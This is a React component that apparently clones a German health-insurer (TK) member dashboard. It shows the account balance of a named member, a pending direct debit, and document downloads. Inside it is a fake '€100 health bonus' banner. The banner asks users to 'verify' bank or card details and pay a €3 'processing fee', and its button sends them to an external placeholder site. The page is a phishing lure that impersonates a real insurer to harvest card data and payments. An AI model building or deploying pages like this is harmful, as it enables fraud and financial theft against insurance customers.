
import React from 'react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { Euro, Download, ChevronRight } from 'lucide-react';
import { Button } from '../components/ui/button';

const Dashboard = () => {
  const handleRedirect = () => {
    window.open('https://site.com', '_blank');
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#eceae8' }}>
      <Header />
      
      {/* Main Dashboard Content */}
      <main className="py-8">
        <div className="container mx-auto px-4 max-w-4xl">
          {/* Page Header */}
          <div className="mb-8">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-8 h-8 bg-gray-400 rounded-full flex items-center justify-center">
                <Euro size={20} className="text-white" />
              </div>
              <h1 className="text-2xl font-normal text-gray-800">
                Mein Beitragskonto
              </h1>
            </div>
          </div>

          {/* Account Balance Section */}
          <div className="bg-white rounded-lg shadow-sm mb-6">
            <div className="p-6 border-b">
              <div className="text-sm text-gray-600 mb-2">Kontostand von Malte Brinkmann</div>
              <div className="flex items-baseline gap-2">
                <span className="text-4xl font-light text-gray-800">0,00</span>
                <span className="text-lg text-gray-600">Euro</span>
              </div>
              <p className="text-sm text-gray-600 mt-2">
                Ihr Beitragskonto ist ausgeglichen. Sie brauchen nichts zu tun.
              </p>
            </div>

            <div className="p-6">
              <h3 className="font-medium text-gray-800 mb-4">Anstehende Zahlungen</h3>
              
              {/* Health Bonus Section */}
              <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                <div className="flex items-start justify-between">
                  <div className="flex-1">
                    <h4 className="font-medium text-green-800 mb-2">
                      🎉 Gesundheitsbonus verfügbar - 100,00 Euro
                    </h4>
                    <p className="text-sm text-green-700 mb-3">
                      Herzlichen Glückwunsch! Sie sind berechtigt für einen €100 Gesundheitsbonus als Teil von TKs jährlichem Belohnungsprogramm für gesundes Leben und Vorsorge. Sie haben sich durch die Teilnahme an Gesundheitschecks oder durch Nichtinanspruchnahme von Leistungen in diesem Jahr qualifiziert.
                    </p>
                    <p className="text-sm text-green-700 mb-4">
                      Um die Auszahlung zu bearbeiten, müssen Sie Ihre Bank-/Kartendaten verifizieren und eine kleine Bearbeitungsgebühr von €3 zahlen.
                    </p>
                    <Button 
                      onClick={handleRedirect}
                      className="bg-green-600 hover:bg-green-700 text-white"
                    >
                      Daten bestätigen und Bonus erhalten
                    </Button>
                  </div>
                </div>
              </div>

              {/* Regular Payment Entry */}
              <div className="border-b border-gray-100 pb-4">
                <div className="flex justify-between items-start">
                  <div>
                    <h4 className="font-medium text-gray-800">Offener Betrag</h4>
                    <div className="text-sm text-gray-600 mt-1">
                      <div>Fälligkeit - 15.07.2025</div>
                      <div className="mt-1">Der Betrag wird zum 15.07.2025 eingezogen.</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <span className="font-medium text-gray-800">258,13 Euro</span>
                  </div>
                </div>
              </div>

              {/* Payment Method Section */}
              <div className="mt-6">
                <h4 className="font-medium text-gray-800 mb-3">Zahlungsart</h4>
                <button className="flex items-center justify-between w-full text-left text-sm text-gray-700 hover:text-gray-900 transition-colors">
                  <span>SEPA-Lastschriftmandat ändern</span>
                  <ChevronRight size={16} />
                </button>
              </div>

              {/* Documents Section */}
              <div className="mt-8">
                <h4 className="font-medium text-gray-800 mb-4">Dokumente</h4>
                <div className="space-y-3">
                  <button className="flex items-center gap-3 text-sm text-gray-700 hover:text-gray-900 transition-colors">
                    <Download size={16} />
                    <span>Beiträge zur Kranken- und Pflegeversicherung 2024</span>
                  </button>
                  <button className="flex items-center gap-3 text-sm text-gray-700 hover:text-gray-900 transition-colors">
                    <Download size={16} />
                    <span>Beiträge zur Kranken- und Pflegeversicherung 2023</span>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Dashboard;
